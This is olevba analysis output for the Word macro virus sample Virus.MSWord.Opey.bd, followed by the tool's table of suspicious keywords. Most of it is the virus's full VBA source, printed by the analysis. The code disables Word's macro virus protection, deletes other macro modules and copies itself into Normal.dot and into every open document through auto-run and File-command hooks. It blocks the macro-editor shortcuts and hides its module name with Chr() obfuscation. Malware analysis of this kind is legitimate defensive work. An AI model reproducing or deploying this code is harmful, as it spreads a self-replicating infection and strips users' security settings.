olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Opey.bd
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Opey.bd - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Linis_Cls.cls 
in file: Virus.MSWord.Opey.bd - OLE stream: 'Macros/VBA/Linis_Cls'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Property Let clsProctection(pValue As Boolean)
       Options.VirusProtection = pValue
End Property
Property Let clsSaveNormal(pValue As Boolean)
       Options.SaveNormalPrompt = pValue
End Property



-------------------------------------------------------------------------------
VBA MACRO Linis_Bbq.bas 
in file: Virus.MSWord.Opey.bd - OLE stream: 'Macros/VBA/Linis_Bbq'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

' ------------------------------------------------------------------------------------
' USER:         Linis-BBQ-2000
' AUTHOR:       FRANCIS LIM
' DATE CREATED: Oct 20, 2000
' ------------------------------------------------------------------------------------


Private Sub Hawaan()
On Error Resume Next

    Dim DocuName$, OpenDocImmunized As Boolean
    Dim I%, J%, NmImmunized$

    NmImmunized = "0"
    
    For I = NormalTemplate.VBProject.VBComponents.Count To 1 Step -1
        DocuName = NormalTemplate.VBProject.VBComponents(I).Name
        If DocuName = GetSource() Then NmImmunized = "1"
        If (DocuName <> GetSource()) And _
           (DocuName <> "Linis_Cls") And _
            (DocuName <> "ThisDocument") Then
            Application.OrganizerDelete _
                Source:=NormalTemplate.FullName _
                , Name:=DocuName _
                , Object:=wdOrganizerObjectProjectItems
        End If
    Next I
    
    
    For Each opendoc In Documents
        OpenDocImmunized = False
        With opendoc
            For J = opendoc.VBProject.VBComponents.Count To 1 Step -1
                DocuName = opendoc.VBProject.VBComponents(J).Name
                If DocuName = GetSource() Then OpenDocImmunized = True
                If (DocuName <> GetSource()) And _
                   (DocuName <> "Linis_Cls") And _
                   (DocuName <> "ThisDocument") And _
                   (DocuName <> "Reference to Normal") Then
                     Application.OrganizerDelete Source:=opendoc.FullName _
                     , Name:=DocuName _
                     , Object:=wdOrganizerObjectProjectItems
                End If
            Next J
            
            If Not OpenDocImmunized Then
                Application.OrganizerCopy Source:=NormalTemplate.FullName, _
                Destination:=opendoc.FullName, _
                Name:="Linis_Cls", _
                Object:=wdOrganizerObjectProjectItems
                opendoc.SaveAs FileName:=opendoc.FullName
            
                Application.OrganizerCopy Source:=NormalTemplate.FullName, _
                Destination:=opendoc.FullName, _
                Name:=GetSource(), _
                Object:=wdOrganizerObjectProjectItems
                opendoc.SaveAs FileName:=opendoc.FullName
            End If
        End With
    Next opendoc
    If NmImmunized = "0" Then
       ActiveDocument.VBProject.VBComponents.Item(GetSource).Export Application.Path & "\102002HS.TMP"
       NormalTemplate.VBProject.VBComponents.Import Application.Path & "\102002HS.TMP"
       ActiveDocument.VBProject.VBComponents.Item("Linis_Cls").Export Application.Path & "\102002HS.TMP"
       NormalTemplate.VBProject.VBComponents.Import Application.Path & "\102002HS.TMP"

       Kill Application.Path & "\102002HS.TMP"
    End If
End Sub


Sub Protectahan()
Dim clsOption As Linis_Cls
On Error Resume Next
      
   Set clsOption = New Linis_Cls
   Application.DisplayAlerts = wdAlertsAll
   WordBasic.DisableAutoMacros -1
   
    With Application
        .UserName = "FRANCIS LIM"
        .UserAddress = "Linis-BBQHS-2000"
        .UserInitials = "BBQ-KY"
    End With
    
    With Dialogs(wdDialogFileSummaryInfo)
        .Author = "FRANCIS LIM"
        .Keywords = "Linis-BBQHS-2000"
        .Execute
    End With

    With Options
        .ConfirmConversions = True
    End With
    clsOption.clsProctection = False
    clsOption.clsSaveNormal = False
    
    With ActiveDocument
        .ReadOnlyRecommended = False
    End With
    
   With CommandBars("Visual Basic")
      .Enabled = True
      .Protection = msoBarTypeMenuBar
      .Protection = msoBarMenuBar
   End With

   With CommandBars("Tools")
      .Reset
      .Controls("Macro").Reset
      .Controls("Customize...").Reset
   End With
   
   

   FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Clear
   FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Clear
   CustomizationContext = NormalTemplate
   Set clsOption = Nothing
End Sub


Sub FileSave()
On Error Resume Next
    Call Protectahan
    Call Hawaan
    ActiveDocument.Save
End Sub

Sub FileClose()
On Error Resume Next
    Call Protectahan
    Call Hawaan
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    ActiveDocument.Close
End Sub

Sub FileExit()
On Error Resume Next
    Call Protectahan
    Call Hawaan
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    Application.Quit
End Sub

Sub FileNew()
On Error Resume Next
    Call Protectahan
    Call Hawaan
    Dialogs(wdDialogFileNew).Show
    Call Hawaan
End Sub

Sub AutoOpen()
On Error Resume Next
   Call Protectahan
   Call Hawaan
End Sub

Sub AutoExec()
On Error Resume Next
    Call Protectahan
    Call Hawaan
End Sub

Sub FileSaveAs()
On Error Resume Next
    Call Protectahan
    Call Hawaan
    Dialogs(wdDialogFileSaveAs).Show
    Call Hawaan
End Sub

Sub FileOpen()
On Error Resume Next
    Call Protectahan
    Call Hawaan
    Dialogs(wdDialogFileOpen).Show
    Call Hawaan
End Sub


































Function GetSource() As String
On Error Resume Next
   GetSource = Chr(76) & Chr(105) & Chr(110) & Chr(105) & Chr(115) & Chr(95) & Chr(66) & Chr(98) & Chr(113)
End Function



+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

